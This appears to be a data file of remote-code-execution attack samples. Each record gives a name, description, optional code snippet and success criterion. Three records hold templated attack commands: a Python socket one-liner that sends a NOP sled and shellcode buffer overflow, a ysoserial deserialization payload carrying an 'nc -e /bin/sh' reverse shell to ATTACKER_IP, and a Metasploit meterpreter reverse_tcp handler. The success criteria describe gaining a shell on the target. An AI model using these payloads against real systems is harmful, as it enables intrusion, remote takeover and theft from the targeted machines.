rce_samples.name: Buffer Overflow Exploit
rce_samples.description: An exploit that triggers a buffer overflow to achieve remote code execution.
rce_samples.code_snippet: python -c 'import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("TARGET_IP", TARGET_PORT)); s.send("A" * BUFFER_SIZE + "\x90" * NOP_SLIDE + SHELLCODE)'
rce_samples.success_criteria: Shell access is obtained on the target system.

rce_samples.name: Web Application RCE via Injection
rce_samples.description: Remote code execution by exploiting a web application SQL injection vulnerability.
rce_samples.success_criteria: Command shell interaction with the web server is achieved.

rce_samples.name: Deserialization Vulnerability
rce_samples.description: Exploiting a deserialization vulnerability to execute arbitrary code on the server.
rce_samples.code_snippet: ysoserial -g CommonsCollections5 'nc -e /bin/sh ATTACKER_IP ATTACKER_PORT' | curl -X POST --data-binary @- 'http://TARGET_URL/serialize'
rce_samples.success_criteria: Reverse shell is established with the attacker's machine.

rce_samples.name: Command Injection
rce_samples.description: Achieving RCE by injecting OS commands through vulnerable application parameters.
rce_samples.success_criteria: The identity of the user running the web server process is revealed.

rce_samples.name: Remote Service Exploit
rce_samples.description: Exploiting a remote service vulnerability to execute code on the target system.
rce_samples.code_snippet: msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT ATTACKER_PORT; exploit'
rce_samples.success_criteria: Meterpreter session is opened on the target system.
